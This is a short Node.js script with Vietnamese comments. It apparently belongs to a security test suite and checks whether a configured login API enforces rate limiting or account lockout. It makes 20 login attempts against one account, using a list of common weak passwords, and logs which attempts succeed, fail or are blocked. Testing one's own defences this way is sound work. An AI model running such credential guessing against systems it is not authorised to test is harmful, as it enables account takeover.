/**
 * Kịch bản 1: Tấn công Brute Force đăng nhập
 *
 * Mục tiêu: Thử đăng nhập với nhiều mật khẩu sai liên tiếp
 * để kiểm tra cơ chế chống brute force (rate limit, lock account)
 */
const axios = require('axios');
const config = require('./config');
const { saveResult, printHeader } = require('./utils');

const ATTACK_NAME = 'BRUTE_FORCE';
const TOTAL_ATTEMPTS = 20;
const TARGET_EMAIL = config.accounts.customer.identifier;

const passwords = [
  '000000', 'password', 'admin', '12345678', 'qwerty',
  'abc123', 'monkey', 'master', 'dragon', 'login',
  'letmein', 'welcome', 'shadow', 'sunshine', 'trustno1',
  '123123', 'football', 'iloveyou', 'batman', '123456',
];

const main = async () => {
  const target = config.target;
  printHeader(ATTACK_NAME, target.name);

  const results = {
    target: target.name,
    totalAttempts: TOTAL_ATTEMPTS,
    successCount: 0,
    failCount: 0,
    blockedCount: 0,
    responses: [],
    startTime: new Date().toISOString(),
  };

  for (let i = 0; i < TOTAL_ATTEMPTS; i++) {
    const password = passwords[i % passwords.length];
    const startTime = Date.now();

    try {
      const res = await axios.post(`${target.api}/auth/login`, {
        identifier: TARGET_EMAIL,
        password: password,
      });

      const elapsed = Date.now() - startTime;
      results.successCount++;
      results.responses.push({ attempt: i + 1, password, status: res.status, elapsed, result: 'SUCCESS' });
      console.log(`  [${i + 1}/${TOTAL_ATTEMPTS}] ${password.padEnd(15)} → ${res.status} SUCCESS (${elapsed}ms)`);
    } catch (err) {
      const elapsed = Date.now() - startTime;
      const status = err.response?.status || 'NETWORK_ERROR';
      const message = err.response?.data?.message || err.message;
      const isBlocked = status === 429 || status === 423;

      if (isBlocked) results.blockedCount++;
      else results.failCount++;

      results.responses.push({ attempt: i + 1, password, status, elapsed, message, result: isBlocked ? 'BLOCKED' : 'FAIL' });
      console.log(`  [${i + 1}/${TOTAL_ATTEMPTS}] ${password.padEnd(15)} → ${status} ${isBlocked ? 'BLOCKED' : 'FAIL'} (${elapsed}ms)`);
    }
  }

  results.endTime = new Date().toISOString();
  saveResult(ATTACK_NAME, target.name, results);

  console.log('\n  ' + '='.repeat(50));
  console.log(`  TỔNG KẾT: ${results.failCount} FAIL | ${results.blockedCount} BLOCKED | ${results.successCount} SUCCESS`);
  console.log('  ' + '='.repeat(50));
};

main().catch(console.error);
